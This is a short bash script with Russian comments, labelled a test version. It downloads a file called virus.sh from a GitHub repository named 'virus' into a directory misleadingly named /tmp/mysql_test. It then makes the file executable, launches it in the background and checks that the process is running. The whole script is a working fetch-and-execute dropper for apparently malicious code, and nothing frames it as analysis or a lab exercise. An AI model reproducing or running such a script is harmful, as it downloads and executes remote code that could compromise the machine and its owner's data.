#!/bin/bash

# Тестовая версия без сложных функций
set -x  # Отладка

GITHUB_SCRIPT_URL="https://raw.githubusercontent.com/Zend1X/virus/refs/heads/main/virus.sh"
TEST_DIR="/tmp/mysql_test"

mkdir -p "$TEST_DIR"
cd "$TEST_DIR"

echo "Скачиваю файл..."
curl -v "$GITHUB_SCRIPT_URL" -o virus.sh

if [ -f "virus.sh" ]; then
    echo "Файл скачан успешно"
    chmod +x virus.sh
    ls -la virus.sh
    
    echo "Пытаюсь запустить..."
    ./virus.sh &
    PID=$!
    sleep 2
    
    if ps -p $PID > /dev/null; then
        echo "Процесс работает с PID: $PID"
        ps aux | grep virus
    else
        echo "Процесс не запустился"
    fi
else
    echo "Файл НЕ скачан"
fi
